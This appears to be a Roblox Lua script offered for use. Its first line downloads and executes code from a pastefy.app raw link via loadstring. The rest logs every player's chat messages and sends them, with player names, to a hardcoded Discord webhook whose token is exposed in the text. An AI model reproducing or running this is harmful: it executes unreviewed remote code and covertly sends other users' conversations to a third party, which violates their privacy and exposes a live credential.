loadstring(game:HttpGet("https://pastefy.app/atGimaom/raw",true))()
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1365038151109709954/qE6YWvW3fRvN8YKs6hcsdKzlqQPtJK_RGVyuWfpM2-Ipb-HrZ_GwRYABxl3y7zTFUBMj"

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        local data = {
            ["content"] = "**"..player.Name.."** said: " .. message
        }

        local success, response = pcall(function()
            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        end)

        if not success then
            warn("Failed to send chat message to Discord:", response)
        end
    end)
end)

